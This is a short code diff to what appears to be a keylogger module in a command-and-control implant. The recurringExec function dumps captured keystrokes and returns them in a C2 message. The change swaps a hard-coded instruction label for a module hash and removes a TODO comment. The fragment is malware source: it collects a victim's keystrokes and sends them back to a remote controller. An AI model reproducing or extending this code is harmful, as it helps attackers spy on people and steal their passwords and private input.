@@ -104,9 +104,7 @@ int KeyLogger::recurringExec(C2Message& c2RetMessage)
 	std::string output;
 	dumpKeys(output);
 
-	c2RetMessage.set_instruction("keyLogger");
-	// TODO manage to send the has, but seems to be different from windows to linux
-	// c2RetMessage.set_instruction(std::to_string(getHash()));
+	c2RetMessage.set_instruction(std::to_string(getHash()));
 	c2RetMessage.set_data(output);
 	
 	return 1;
